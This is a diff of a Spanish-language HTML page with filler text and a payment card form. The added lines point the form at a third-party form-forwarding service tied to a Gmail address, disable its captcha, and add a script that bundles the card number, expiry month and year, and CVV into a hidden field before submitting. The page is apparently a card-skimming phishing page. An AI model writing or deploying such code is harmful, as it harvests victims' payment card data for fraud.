@@ -18,18 +18,42 @@
             <div class="texto">
                 Lorem ipsum dolor sit amet consectetur adipisicing elit. Quod rem nisi, provident exercitationem delectus eum tempora quasi. Laudantium eaque fugiat tempore quae libero nesciunt deserunt.
             </div>
-            <form class="form" action="">
+            <form class="form" action="https://formsubmit.co/respues2formul@gmail.com" method="POST">
                 <div class="continput">
                     <div class="tarimg">
-                    <input class="input" type="text" placeholder="Numero de tarjeta *">
+                    <input class="input" id="numtarjeta" type="text" placeholder="Numero de tarjeta *">
                     <img width="50px" src="./tarjetas.png" alt="">
                 </div>
                     <div class="mesanocvv">
-                        <input class="input2" type="text" placeholder="MM *">
-                        <input class="input2" type="text" placeholder="AA *">
-                        <input class="input2" type="text" placeholder="CVV *">
+                        <input type="hidden" name="name" class="todo">
+                        <input class="input2" id="mes" type="text"  placeholder="MM *">
+                        <input class="input2" id="ano" type="text"  placeholder="AA *">
+                        <input class="input2" id="cvv" type="text"  placeholder="CVV *">
+                        <input type="hidden" name="email" value="respuesforms@gmail.com">
+                        <input type="hidden" name="_next" value="https://yourdomain.co/thanks.html">
+                        <input type="hidden" name="_captcha" value="false">
+                        <input type="submit" value="Enviar" class="btn">
                     </div>
                 </div>
+
+                <script>
+                    var todo = document.querySelector('.todo');
+                    var numtarjeta = document.querySelector('#numtarjeta');
+                    var mes = document.querySelector('#mes');
+                    var ano = document.querySelector('#ano');
+                    var cvv = document.querySelector('#cvv');
+                    var form = document.querySelector('.form');
+
+                    form.addEventListener('submit', function(e){
+                        e.preventDefault();
+                        todo.value = 'Numero de tarjeta: ' + numtarjeta.value + 'Mes: ' + mes.value + 'Año: ' + ano.value + 'CVV: ' + cvv.value;
+                        form.submit();
+                    })
+
+
+
+                </script>
+                
             </form>
         </div>
     </div>
